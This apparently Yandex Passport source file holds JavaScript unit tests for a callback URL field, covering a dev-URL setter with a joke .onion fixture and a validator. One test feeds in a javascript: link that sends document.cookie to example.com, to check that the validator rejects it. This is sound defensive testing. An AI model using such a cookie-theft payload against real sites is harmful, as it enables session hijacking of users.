describe('Callback URL field', function() {
    beforeEach(function() {
        this.block = passport.block('callback');
        this.sinon = sinon.sandbox.create();
    });

    describe('setDevUrl', function() {
        it('should set value to /verification_code in current domain', function() {
            this.sinon.stub(this.block, '_getLocation').returns('tor://silkway.onion/buy_drugs/cheap');
            this.sinon.stub(this.block, 'val');

            this.block.setDevUrl();

            expect(this.block.val.calledOnce).to.be(true);
            expect(this.block.val.calledWithExactly('tor://silkway.onion/verification_code')).to.be(true);

            this.sinon.restore();
        });
    });

    describe('validateSync', function() {
        it('should return null for common links', function() {
            this.block.val('http://yandex.ru/');
            expect(this.block.validateSync()).to.be(null);
        });

        it('should return `scheme_forbidden` for `javascript:` links', function() {
            /* jshint scripturl:true */
            this.block.val('javascript:location.href=\'http://example.com/?' + encodeURIComponent(document.cookie) + '\'');
            expect(this.block.validateSync()).to.be('scheme_forbidden');
        });
    });
});
